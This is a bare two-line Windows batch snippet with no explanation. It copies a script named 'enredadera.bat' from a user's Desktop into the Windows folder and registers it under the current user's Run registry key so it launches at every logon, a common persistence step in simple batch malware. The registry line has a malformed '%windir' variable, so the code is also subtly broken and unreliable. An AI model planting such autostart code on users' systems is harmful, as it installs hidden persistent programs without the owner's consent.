copy C:\Users\nombre_usuario\Desktop\enredadera.bat %windir%\
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v enredadera /d %windir\enredadera.bat
